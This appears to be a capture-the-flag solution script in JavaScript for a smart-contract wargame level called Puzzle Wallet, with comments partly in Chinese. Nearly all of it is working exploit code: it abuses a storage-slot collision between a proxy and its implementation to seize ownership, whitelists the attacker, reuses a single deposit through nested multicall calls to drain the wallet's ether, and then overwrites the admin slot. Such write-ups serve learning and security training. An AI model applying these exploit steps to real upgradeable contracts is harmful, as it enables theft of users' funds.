var proxy = await new web3.eth.Contract([
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_admin",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "_implementation",
                "type": "address"
            },
            {
                "internalType": "bytes",
                "name": "_initData",
                "type": "bytes"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "anonymous": false,
        "inputs": [
            {
                "indexed": true,
                "internalType": "address",
                "name": "implementation",
                "type": "address"
            }
        ],
        "name": "Upgraded",
        "type": "event"
    },
    {
        "stateMutability": "payable",
        "type": "fallback"
    },
    {
        "inputs": [],
        "name": "admin",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_expectedAdmin",
                "type": "address"
            }
        ],
        "name": "approveNewAdmin",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "pendingAdmin",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_newAdmin",
                "type": "address"
            }
        ],
        "name": "proposeNewAdmin",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_newImplementation",
                "type": "address"
            }
        ],
        "name": "upgradeTo",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    }
], instance)


//    update proxy contract slot0(pendingAdmin) and PuzzleWallet slot0(owner) also changed.
await proxy.methods.proposeNewAdmin(player).send({ from: player })

await contract.owner() // should now be your address
await contract.addToWhitelist(player); // overcomes the onlyWhitelisted modifier protecting the functions in the contract
await contract.whitelisted(player) // should now return true


// Use multicall to drain the wallet of funds
// this.deposit.selector -> 函数选择器
// web3.utils.keccak256('deposit()') // 0xd0e30db0
// 或者var {data: puzzleDeposit } = await contract.deposit.request() // 0xd0e30db0

// function 1
var { data: puzzleDeposit } = await contract.deposit.request() // 0xd0e30db0
// function 2
var { data: inceptionMultiCall } = await contract.multicall.request([puzzleDeposit]);
// function 3
var { data: puzzleExecute } = await contract.execute.request(player, web3.utils.toWei('0.002', 'ether'), []);

// drain all fund and bypass require condition inside setMaxBalance, after that attacker can 
// update maxBalance(PuzzleWallet&PuzzleProxy slot1)
var our3Functions = [
    // first desposit
    puzzleDeposit,
    // bypass desposit only once
    inceptionMultiCall,
    // execute transaction to drain all fund
    puzzleExecute,
];
await contract.multicall(our3Functions, { from: player, value: web3.utils.toWei('0.001', 'ether') });

await web3.eth.getBalance(instance) // should now be 0

await contract.setMaxBalance(player);
